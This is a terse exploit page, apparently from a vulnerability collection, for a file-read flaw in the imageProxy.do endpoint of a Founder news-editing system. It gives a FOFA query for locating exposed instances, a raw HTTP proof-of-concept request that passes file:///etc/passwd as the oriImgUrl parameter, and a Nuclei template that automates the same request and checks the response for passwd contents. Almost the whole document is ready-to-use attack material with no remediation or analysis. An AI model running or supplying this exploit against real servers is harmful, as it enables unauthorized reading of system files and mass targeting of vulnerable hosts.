# fofa

```plain
body="/newsedit/newsedit/"
```

# poc

```http
POST /newsedit/outerfotobase/imageProxy.do HTTP/1.1
Host: 
Accept: application/json,text/javascript, */* ;q=0.9,*/*;q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Connections: close
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

oriImgUrl=file:///etc/passwd
```

# nuclei

```yaml
id: founder-xinwencaibian-imageProxy-download

info:
  name: founder-xinwencaibian-imageProxy-download
  author: zxf
  severity: high
  metadata:
    fofafearch: body="/newsedit/newsedit/"
    
http:
  - raw:
      - |
        POST /newsedit/outerfotobase/imageProxy.do HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json,text/javascript, */* ;q=0.9,*/*;q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
        Connections: close
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8

        oriImgUrl=file:///etc/passwd
        
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
      - type: status
        status:
          - 200
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739078241157-ddd6145c-6087-4612-8f51-dcf77f630504.png)